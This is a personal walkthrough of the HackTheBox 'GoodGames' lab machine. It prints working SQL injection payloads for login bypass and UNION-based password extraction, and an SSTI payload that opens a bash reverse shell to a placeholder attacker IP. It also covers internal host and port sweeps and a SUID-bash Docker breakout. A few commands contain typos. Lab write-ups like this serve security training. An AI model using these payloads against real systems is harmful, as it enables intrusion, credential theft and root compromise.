# GoodGames HackTheBox Easy Linux Machine Write up

![image](https://github.com/user-attachments/assets/2d1625a8-9f81-4721-9f7e-7eb5d3fc44c9)

GoodGames is an easy linux machine that can be used to train your skills in SQL Injection, SSTI, and breaking out from Docker Container.

## Vulnerability Found
1. SQL Injection (using union SQL Injection to read data from database)
2. SQL Injection to bypass login
3. Server Side Template Injection (SSTI)
4. Password reuse for different services

## Step to Re-produce

## Enumeration

### Network Enumeration

First thing I did was enumerate the network services. I used `nmap` to do this.
Payload:

    nmap IP-TARGET -sV -sC -T5 -O -oN outputfile.txt

<div align="center">
  <img src="![image](https://github.com/user-attachments/assets/435788ed-ba62-4493-be27-9d47e1ef393f">
</div>
<div>
  Nmap output
</div>
</br>

From the nmap output, I found out that this IP has http service opened. Then, I looked it up and found the web page.

### Web Enumeration

For web enumeration, I spotted a profile icon and it popped up as login popped up. I tried SQL injection to bypass this login using `Burpsuite` by adding SQL Injection payload in `name` parameter and it worked.

Payload:

    ' or 1=1#

<div align="center">
  <img src="https://github.com/user-attachments/assets/2ec42320-a8d9-4a08-8abe-a7502b4dfd8e">
</div>
<div>
 SQL Injection bypass login successful
</div>
</br>

After that, the web redirected me into the home page and there was another 2 icons. The interesting one is the settings icon because when I clicked it, the web redirected me to another subdomain for internal administration.

<div align="center">
  <img src="https://github.com/user-attachments/assets/a39801de-e4bc-4d10-aa25-1a654d0bd55e">
</div>
<div>
Internal administration login page
</div>
</br>

At first, I tried SQL injection again but this time it didn't work. So, I went back to the main domain and perform SQL injection on the login request again but this time I used it to retrieve data from database to see if I could find admin's password and hopefully it used too in internal administration page

## Exploitation

### SQL Injection to Retrieve Data from Database

First, to perform UNION SQL Injection, I needed to find how many columns are returned from the original query. This because if you perform UNION SQL Injection, the UNION query needs to returned the same number of columns from the original query.

To do this, I made a login request again but this time I used this SQL query on the name parameter:

SQL Query to find number of columns returned:

    ' UNION SELECT NULL#

That is the query. How can we know the correct numbers? The answer is if the database or server doesn't returned an error, then that is the correct number of columns. In this web, the correct number was 4 columns and it will show like the photo below.

SQL query:

    ' UNION SELECT NULL, NULL, NULL, NULL#

<div align="center">
  <img src="https://github.com/user-attachments/assets/625d8f20-6d5b-46ca-99e6-08576d848787">
</div>
<div>
Number of columns returned found
</div>
</br>

Next, finding out which columns is return a string because the data that I want to retrieve is a string (admin password). To do this, you can use this SQL query:

SQL query to find which columns is string:

    ' UNION SELECT 'a', NULL, NULL, NULL#

The 'a' is to check whether the column where the 'a' located is returning a string. If the database or server doesn't return an error then it is correct. You can try this for each column. 

But, in this web, only the fourth column that is shown in the web page. You can try this by yourself by change 'a' to the fourth column/NULL.

<div align="center">
  <img src="https://github.com/user-attachments/assets/6c2fe5e0-d800-4bb2-bb86-bbcb888cc870">
</div>
<div>
SQL Payload
</div>
</br>

<div align="center">
  <img src="https://github.com/user-attachments/assets/9c46e97e-5f7d-47a9-81d5-5973d4521ac9">
</div>
<div>
SQL Payload
</div>
</br>

As you can see, the 'a' is appeared. Next, listing the database. The payload is in the picture below

<div align="center">
  <img src="https://github.com/user-attachments/assets/94125793-5490-4056-95a5-50fc0c9d700f">
</div>
<div>
SQL Payload to list database/schema
</div>
</br>

Payload:

    ' UNION SELECT NULL, NULL, NULL, schema_name FROM information_schema.schemata#

<div align="center">
  <img src="https://github.com/user-attachments/assets/dcf8f002-6373-40ad-8171-843fb20cf075">
</div>
<div>
Schema/database names
</div>
</br>

From the output above, I knew that there were 2 schemas, information schema which is the default and **main**. **main** must be the database that are used. So, next I tried to see tables name in this database. The payload is in the picture below

<div align="center">
  <img src="https://github.com/user-attachments/assets/089bc8b5-026c-4562-9971-baf0b64959f9">
</div>
<div>
SQL Payload to list table name
</div>
</br>

Payload:

    ' UNION SELECT NULL, NULL NULL, table_name FROM information_schema.tables WHERE table_schema='main'#

<div align="center">
  <img src="https://github.com/user-attachments/assets/dcf8f002-6373-40ad-8171-843fb20cf075">
</div>
<div>
tables in main database
</div>
</br>

The above results shows that the database has 2 tables. First is blogblog_comment and the second one is user. Of course user is the one more interesting. Next, I tried to see columns name in this table.

<div align="center">
  <img src="https://github.com/user-attachments/assets/a319a66d-4213-4bcb-8840-42ae93820e1f">
</div>
<div>
SQL Payload to see columns name
</div>
</br>

Payload:

    ' UNION SELECT NULL, NULL NULL, column_name FROM information_schema.columns WHERE table_name='user'#

<div align="center">
  <img src="https://github.com/user-attachments/assets/1423ab20-345c-44ab-a619-0cbf16cec481">
</div>
<div>
Result
</div>
</br>

The columns returned were **id**, **email**, **password**, **name**. Next, because in the internal administration web asked us to provide username and password, I only retrieve both of them without email and ID.

Payload for password:

    ' UNION SELECT NULL, NULL NULL, password FROM user#

<div align="center">
  <img src="https://github.com/user-attachments/assets/46b0fd6e-fde3-482e-9413-f09bd1fa158e">
</div>
<div>
Result
</div>
</br>

The password was hashed but it used a weak hash. With web like [hashes.com](https://hashes.com/en/decrypt/hash), I decrypted it.

<div align="center">
  <img src="https://github.com/user-attachments/assets/352414fb-82a1-47ba-8b9c-25b1b68d1471">
</div>
<div>
Decrypted password
</div>
</br>


<div align="center">
  <img src="https://github.com/user-attachments/assets/a319a66d-4213-4bcb-8840-42ae93820e1f">
</div>
<div>
SQL Payload to see name
</div>
</br>

Payload:

    ' UNION SELECT NULL, NULL NULL, name FROM user#

<div align="center">
  <img src="https://github.com/user-attachments/assets/e00246c4-116a-4246-98bd-67e251b68243">
</div>
<div>
Result
</div>
</br>

### Login into Internal Administration Web Domain

After found the password and name, I used it to login into the internal web and it worked. When I looked around the web, there were not much to do. Almost every button doesn't do anything. But, I can go to setting profile and change the Full Name of admin. At first, I tried XSS attack and it worked. But, I thought that what is the purpose of XSS in this, because I already logged in as admin, I didn't need to steal cookie or anything again. It took me like an hour to figure it out by myself but I gave up. I looked for this machine's write up and found out turns out it was Server-side Template Injection vulnerability on the update full name feature. Here is the link for the write up: [GoodGames Write Up](https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html). You should check it out!

<div align="center">
  <img src="https://github.com/user-attachments/assets/0edac5cb-c285-4997-a3bf-35cb8173ebf1">
</div>
<div>
Testing SSTI with {{1+1}} 
</div>
</br>

Okay, after finding the vulnerability and test it by input `{{1+1}}` payload on the full name parameter and it returned `49` on the web. I knew this was SSTI vulnerability (duh of course I looked for write up lol #ihaveaskillissue haha). To do exploit this vulnerability, to be honest, I followed the write up. So you guys can follow them too. The point is, I need to input a command to perform reverse shell.

Payload:

    {{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/YOUR-IP/YOUR-PORT 0>&1"').read() }}

Before input the payload, first I ran up `netcat` listener: `nc -lvnp YOUR-PORT`. After ran up the netcat listener, I input the payload on the web and got the reverse shell.

After got the reverse shell, I tried to continue on my own without looked up to write up.

## User.txt

After obtaining shell, I moved to `/home` directory and found that there is a user with name `augustus`. I moved to `augustus` directory and found the user.txt

<div align="center">
  <img src="https://github.com/user-attachments/assets/f3756726-8e05-4314-a55b-2d60215734dd">
</div>
<div>
user.txt
</div>
</br>

## Root.txt

Again, for like 30 minutes, I didn't know what to do. So, I looked up again to the write up earlier and turns out the shell I was in was a docker container and I needed to 'break out' from the container.

### 'Breaking out' from Docker container

By following the write up, to do this, first I needed to know the IP of the docker container. I used `ip a` to see it.

<div align="center">
  <img src="https://github.com/user-attachments/assets/70212720-18e7-427c-9895-02837268d0bc">
</div>
<div>
docker container IP
</div>
</br>

The docker run on `172.19.0.2` with subnet `\16`.

### Enumerating service

Next, I tried to find another IP in the subnet. To do this, I used this command:

    for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done;


<div align="center">
  <img src="https://github.com/user-attachments/assets/28e23640-57bd-4ad4-943c-81f3815991b1">
</div>
<div>
another ip
</div>
</br>

From enumerating, I found out there are another ip on `172.19.0.1` which is supposed to be the host. After finding this IP, I looked up the services that were used and opened with this command:

    for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null

<div align="center">
  <img src="https://github.com/user-attachments/assets/3d63ce54-0b3c-407c-8390-aae898b352ef">
</div>
<div>
enumerating result
</div>
</br>

I found out there were 2 open ports, 80 and 22, which 22 is SSH.

### SSH

Next, I tried to connect to SSH by user that were found earlier which is `augustus` and I tried the same password that were found and used to logged in into internal administration web to see if they reuse this password.

<div align="center">
  <img src="https://github.com/user-attachments/assets/ca07e788-2e9a-49ed-965c-4e547cf9ad29">
</div>
<div>
ssh login as augustus
</div>
</br>

At this time, I successfully connected to ssh as augustus. Now, trying to become root in this ssh which I followed the write up.

### Privilege Escelation

<div align="center">
  <img src="https://github.com/user-attachments/assets/a8c41f6c-c93d-46a7-9cb3-56746d14ac20">
</div>
<div>
host
</div>
</br>

From the picture above, it seems that this ssh shell is in the same IP as the machine's IP. 

<div align="center">
  <img src="https://github.com/user-attachments/assets/95d2efba-be4f-46de-a66d-573cec8629a1">
</div>
<div>
augustus directory on docker container
</div>
</br>

<div align="center">
  <img src="https://github.com/user-attachments/assets/7c11631e-9f34-4bbd-aac1-beb9d7b751c4">
</div>
<div>
augustus directory on ssh shell
</div>
</br>

From the comparison on the `augustus` home directory, it add assumption that this shell is still in the same network as the docker container. My thinking was the machine's IP have docker container and Host in the network. Host and docker container also connected (I don't really understand how but it is). So, If I create something in augustus home directory in ssh shell, it will appear too in the docker container shell.

First, I ran `cp /bin/bash` into augustus home directory in the ssh shell.

<div align="center">
  <img src="https://github.com/user-attachments/assets/73c3cd14-abfa-44bd-b9f6-0e95bd841d00">
</div>
<div>
cp /bin/bash to augustus home directory
</div>
</br>

And that will appeared too in the docker container.

<div align="center">
  <img src="https://github.com/user-attachments/assets/a23a1295-edc7-4bba-b197-50cb84f2e8cb">
</div>
<div>
bash appeared in docker container
</div>
</br>

Then in the docker container, by following the write up, I changed the owner of the bash file into root and changed the permission to be SUID.

command:

    chmown root:root bash
    chmod 4777 bash

Next, go to the ssh shell again and run the bash `./bash -p`.

<div align="center">
  <img src="https://github.com/user-attachments/assets/99d0cb1c-144e-407e-80b8-fbbfe88c9357">
</div>
<div>
gain root shell in ssh
</div>
</br>

Next, moved to `/root` directory to read the root.txt

<div align="center">
  <img src="https://github.com/user-attachments/assets/01d5a2b9-722e-44f0-b931-ba81e1652041">
</div>
<div>
root.txt
</div>
</br>



